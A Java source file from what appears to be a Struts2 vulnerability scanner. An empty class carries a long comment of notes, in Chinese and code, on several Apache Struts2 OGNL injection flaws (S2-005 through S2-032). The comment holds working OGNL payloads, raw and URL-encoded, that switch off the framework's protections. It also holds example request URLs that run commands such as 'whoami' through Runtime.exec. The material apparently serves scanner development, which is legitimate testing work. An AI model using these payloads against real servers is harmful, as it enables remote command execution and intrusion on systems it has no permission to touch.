package com.shaobing.wallaby.core.jscan.common;

/**
 * 说明
 *
 * @author luyb@servyou.com.cn
 * @version $$: Description.java v 0.1 2016/11/29 19:45 luyb Exp $$
 */
public class Description {
    //http://wenku.baidu.com/link?url=bR6jF6Oe2FeL-m_3MmLijfl-GNk6iov7aiJ517GCZxX4jqVeIlo7Xs8yKmrBTQXTEVdIM4Ks9pVIntt3TyV74_6-nfeIO6qPQFE8MpP3J3G
/**
 *\
 * http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
 *
 * ApacheS2005
 * # _memberAccess.allowStaticMethodAccess=true
 * #context['xwork.MethodAccessor.denyMethodExecution']=false
 * #_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET
 * #req=@org.apache.struts2.ServletActionContext@getRequest()
 * #xman=@org.apache.struts2.ServletActionContext@getResponse()
 * #xman.getWriter().println(@java.lang.System@getProperty('key'))
 * #xman.getWriter().close()
 *
 * S2-008命令执行，不过这其实是Struts2开发模式的一个特性，严格来讲不能算是漏洞，
 * 只不过在他的处理逻辑当中用户可以控制执行OGNL，但是默认struts2的开发模式是关闭的，所以此漏洞很鸡肋。
 * 但值得一提的是一直到2014年pwntesting的一篇分析文章中给出S2-008的利用方式，
 * 真正利用java反射类修改前面那两个属性的奇技淫巧
 *
 *
 *
 *
 * # S2-008
 *    String payload = "%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23e%3d@java.lang.System@getProperty%28%22" + key + "%22%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23e%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29";
 *                     #context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#e=@java.lang.System@getProperty(""   key   ""),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#e),#genxor.flush(),#genxor.close()";
 *    #context["xwork.MethodAccessor.denyMethodExecution"]=false,
 *    #f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),
 *    #f.setAccessible(true),
 *    #f.set(#_memberAccess,true),
 *    #e=@java.lang.System@getProperty("key"),
 *    #genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),
 *    #genxor.println(#e),
 *    #genxor.flush(),
 *    #genxor.close();
 *
 *
 *     if (this.vulIDComboBox.getSelectedItem().toString().equals("S2-008")) {
 *       return "debug=command&expression=" + paystr;
 *       }
 *       if (this.vulIDComboBox.getSelectedItem().toString().equals("S2-009")) {
 *           return "class.classLoader.jarPath=(" + paystr + ")(aa)&x[(class.classLoader.jarPath)('aa')]";
 *       }
 *       if (this.vulIDComboBox.getSelectedItem().toString().equals("S2-016")) {
 *           return "redirect:${" + paystr + "}";
 *       }
 *
 * #S2-013
 *  http://localhost:8080/s2/test/hello.action?fakeParam=%25%7B(%23_memberAccess%5B'allowStaticMethodAccess'%5D%3Dtrue)(%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse)(%23writer%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23writer.println('hacked')%2C%23writer.close())%7D
 *  http://www.nsfocus.net/vulndb/23747
 *
 * #S2-016
 *  "redirect:${" + paystr + "}";
 *
 *
 *
 * # s2-20
 * http://www.ulewo.com/knowledge/2224
 *  (1) ddos  http://localhost:8080/s2/test/hello.action?class.classLoader.resources.dirContext.docBase=/fjlajfla
 *
 *  (2) class.classLoader.resources.dirContext.docBase
 *  docBase
 *  重启tomcat,如果docBase指向的是war文件,会自动将war解压到 webapps/ROOT 目录;如果docBase指向的是应用已解压好的目录
 *
 *  docBase参数有三种地址路径部署方式:
 *  1.相对路径:以Tomcat的webapps目录为更目录
 *  2.绝对路径:如,c://web/部署的应用目录
 *   但,还有一种地址配置方式,大家可能不会常用,那就是UNC path(tomcat是支持远程网络路径方式的):
 *  3.UNC path(如,远程共享一个标准的J2EE应用目录)
 *
 *
 *
 *  # s2-32
 *
 *  #_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,
 *  #out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),
 *  #out.print(#parameters.hook[0]),
 *  #out.print(new java.lang.Integer(829+9)),
 *  #out.close(),#none=new java.lang.String
 *
 *  name=test&method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.print(#parameters.name),#out.print(new java.lang.Integer(829+9)),#out.close(),#none=new java.lang.String
 *
 *  name=test&method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23out%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23out.print(%23parameters.name)%2c%23out.print(new+java.lang.Integer(829%2b9))%2c%23out.close()%2c%23none%3dnew+java.lang.String
 *
 *
 * http://localhost:8080/struts28/example/HelloWorld.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]),1?%23xx:%23request.toString&command=open+/Applications/Calculator.app
 * http://localhost:8080/struts28/example/HelloWorld.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]),1?%23xx:%23request.toString&command=whoami
 *
 * https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-032
 * http://avfisher.win/archives/tag/s2-032
 * https://github.com/brianwrf/hackUtils
 *
 */

}
